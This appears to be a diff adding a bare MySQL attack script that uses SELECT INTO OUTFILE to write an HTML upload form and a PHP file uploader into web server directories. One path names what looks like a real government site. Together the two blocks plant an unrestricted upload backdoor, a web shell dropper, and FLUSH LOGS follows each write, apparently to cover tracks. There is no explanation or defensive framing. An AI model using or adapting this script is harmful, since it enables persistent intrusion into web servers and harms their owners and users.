@@ -1,0 +1,16 @@
+use mysql;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<form enctype="multipart/form-data" action="upload.php" method="post"><pre lang="html">Upload file :<form enctype="multipart/form-data" action="upload2.php" method="post"><input name="userfile" type="file" /><input type="submit" value="Upload" /></form>');
+SELECT * INTO OUTFILE '/var/www/html/pojak-webapp/app/webroot/upload/' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
+
+use mysql;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<?php $uploaddir = "/var/www/html/bapenda/profil/";$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);echo "
+<pre>";if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile))print "";?>');
+SELECT * INTO OUTFILE '/var/www/html/bapenda/profil/upload.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
